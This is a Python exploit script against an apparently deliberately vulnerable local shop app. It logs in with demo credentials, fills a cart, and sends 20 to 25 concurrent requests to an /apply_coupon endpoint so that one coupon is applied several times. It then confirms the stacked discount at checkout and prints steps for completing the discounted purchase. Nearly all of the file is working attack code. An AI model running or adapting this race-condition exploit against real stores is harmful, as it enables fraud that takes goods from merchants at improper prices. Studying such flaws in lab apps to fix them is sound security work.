#!/usr/bin/env python3
"""
Apply Coupon Race Condition Exploit
===================================

This script exploits the race condition in the /apply_coupon endpoint
to stack multiple discount applications before making a purchase.
"""

import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor

class ApplyCouponRaceExploit:
    def __init__(self, base_url="http://127.0.0.1:5002"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def login(self, username="john_doe", password="password123"):
        """Login to get session cookies"""
        print(f"üîë Logging in as {username}...")
        
        response = self.session.get(f"{self.base_url}/login")
        if response.status_code != 200:
            print(f"‚ùå Failed to access login page: {response.status_code}")
            return False
            
        login_data = {'username': username, 'password': password}
        response = self.session.post(f"{self.base_url}/login", data=login_data)
        
        if "dashboard" in response.url or response.status_code == 302:
            print("‚úÖ Login successful")
            return True
        else:
            print("‚ùå Login failed")
            return False
            
    def setup_cart(self):
        """Add items to cart for testing"""
        print("üõí Setting up cart...")
        
        # Add Gaming Mouse - $79.99
        response = self.session.post(f"{self.base_url}/add_to_cart", 
                                   data={'product_id': 3, 'quantity': 1})
        
        if response.status_code in [200, 302]:
            print("‚úÖ Added Gaming Mouse ($79.99) to cart")
            return True
        else:
            print(f"‚ùå Failed to add item to cart: {response.status_code}")
            return False
            
    def race_condition_exploit(self, coupon_code="SAVE10", num_threads=20):
        """Exploit race condition in apply_coupon endpoint"""
        print(f"\nüö® APPLYING COUPON RACE CONDITION EXPLOIT")
        print(f"üéØ Target: /apply_coupon endpoint")
        print(f"üè∑Ô∏è  Coupon: {coupon_code}")
        print(f"üîÄ Concurrent threads: {num_threads}")
        print(f"‚è±Ô∏è  Exploiting 300ms race condition window...")
        
        results = []
        successful = 0
        
        def apply_coupon_request(thread_id):
            try:
                # Use same session cookies for all requests
                response = self.session.post(f"{self.base_url}/apply_coupon",
                                           data={'coupon_code': coupon_code},
                                           allow_redirects=False)
                
                success = response.status_code in [200, 302]
                print(f"üéØ Thread {thread_id:2d}: HTTP {response.status_code}")
                
                # Check if discount was applied by looking for success message
                if success and 'You save $' in response.text:
                    print(f"üí∞ Thread {thread_id:2d}: Discount applied!")
                
                return {
                    'thread_id': thread_id,
                    'status': response.status_code,
                    'success': success,
                    'has_discount': 'You save $' in response.text if success else False
                }
            except Exception as e:
                print(f"‚ùå Thread {thread_id:2d}: Error - {str(e)[:50]}")
                return {
                    'thread_id': thread_id,
                    'error': str(e),
                    'success': False
                }
        
        # Launch concurrent apply_coupon requests
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = {executor.submit(apply_coupon_request, i): i for i in range(1, num_threads + 1)}
            
            for future in futures:
                result = future.result()
                results.append(result)
                if result.get('success', False):
                    successful += 1
        
        print(f"\nüìä APPLY_COUPON RACE CONDITION RESULTS:")
        print(f"   Successful requests: {successful}/{num_threads}")
        print(f"   Failed requests: {num_threads - successful}")
        
        discount_applications = sum(1 for r in results if r.get('has_discount', False))
        
        if discount_applications > 1:
            print(f"üö® RACE CONDITION EXPLOITED!")
            print(f"   Multiple discount applications: {discount_applications}")
            print(f"   Expected: 1 discount application")
            print(f"   Actual: {discount_applications} discount applications")
            print(f"üí° Now go to checkout to see stacked discounts!")
        elif discount_applications == 1:
            print(f"‚ö†Ô∏è  Only 1 discount applied - race condition might not have worked")
        else:
            print(f"‚ùå No discounts applied - check your setup")
            
        return results
    
    def check_checkout_discount(self):
        """Check the final discount at checkout"""
        print(f"\nüîç Checking checkout page for stacked discounts...")
        
        response = self.session.get(f"{self.base_url}/checkout")
        if response.status_code == 200:
            content = response.text
            
            # Look for discount information
            if 'RACE CONDITION:' in content:
                print(f"üéâ RACE CONDITION EXPLOITATION CONFIRMED!")
                print(f"   Multiple discounts stacked successfully!")
            elif 'You save $' in content:
                print(f"üí∞ Single discount applied (race condition didn't stack)")
            else:
                print(f"‚ùå No discount found on checkout page")
        else:
            print(f"‚ùå Failed to access checkout page: {response.status_code}")

def main():
    print("üöÄ APPLY_COUPON RACE CONDITION EXPLOIT TOOL")
    print("=" * 50)
    
    exploit = ApplyCouponRaceExploit()
    
    # Setup
    if not exploit.login():
        return
    
    if not exploit.setup_cart():
        return
    
    # Run exploit
    results = exploit.race_condition_exploit("SAVE10", 25)
    
    # Check results
    exploit.check_checkout_discount()
    
    print(f"\n" + "=" * 50)
    print(f"üéØ MANUAL TESTING INSTRUCTIONS:")
    print(f"1. Go to http://127.0.0.1:5002/checkout")
    print(f"2. Look for 'RACE CONDITION:' message in coupon area")
    print(f"3. If successful, you'll see stacked discounts!")
    print(f"4. Complete purchase to get massive discount!")

if __name__ == "__main__":
    main()
